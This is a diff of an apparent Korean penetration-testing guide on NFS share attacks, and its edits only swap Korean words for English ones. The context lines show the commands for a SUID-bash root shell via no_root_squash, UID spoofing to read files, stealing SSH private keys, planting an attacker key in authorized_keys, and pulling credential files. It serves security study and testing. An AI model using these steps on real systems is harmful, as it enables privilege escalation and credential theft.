@@ -54,14 +54,14 @@ umount /tmp/nfs
 # no_root_squash인 경우: SUID 바이너리 배치
 cp /bin/bash /tmp/nfs/bash
 chmod +s /tmp/nfs/bash
-# 타겟에서: /share/bash -p → root 쉘
+# target에서: /share/bash -p → root 쉘
 ```
 
 ### UID/GID 스푸핑
 
 ```bash
 # NFS에서 파일 접근 권한은 UID/GID 기반
-# 타겟 파일의 소유자 UID를 확인하고 로컬에서 동일한 UID로 사용자 생성
+# target 파일의 소유자 UID를 확인하고 로컬에서 동일한 UID로 사용자 생성
 
 # 파일 소유자 확인
 ls -ln /tmp/nfs/
@@ -75,7 +75,7 @@ cat /tmp/nfs/sensitive_file
 ### SSH 키 탈취/배치
 
 ```bash
-# .ssh 디렉토리 접근 가능 시
+# .ssh directory 접근 가능 시
 cat /tmp/nfs/home/user/.ssh/id_rsa
 
 # authorized_keys에 공격자 키 추가
@@ -142,7 +142,7 @@ mount -t nfs TARGET:/share /mnt/nfs
 cp /bin/bash /mnt/nfs/pwn
 chmod +s /mnt/nfs/pwn                     # SUID 비트 설정
 
-# 타겟 (NFS 서버 쉘, 일반 사용자)
+# target (NFS 서버 쉘, 일반 사용자)
 /share/pwn -p
 # → euid=0(root) 쉘
 ```
@@ -163,4 +163,4 @@ cp /bin/bash /mnt/nfs/pwn && chmod +s /mnt/nfs/pwn
     NFS 서버는 `rpc.mountd`, `rpc.nfsd` 로그를 남긴다. `/var/log/messages`, `journalctl -u nfs-server` 에 클라이언트 IP / 마운트 기록이 찍힘.
 
 !!! tip "쓰기 권한 없이도 공격 가능"
-    읽기 전용이어도 `.ssh/id_rsa`, `.bash_history`, `.aws/credentials` 등 자격 증명 파일 유출이 주목표.
+    읽기 전용이어도 `.ssh/id_rsa`, `.bash_history`, `.aws/credentials` 등 credential 파일 유출이 주목표.
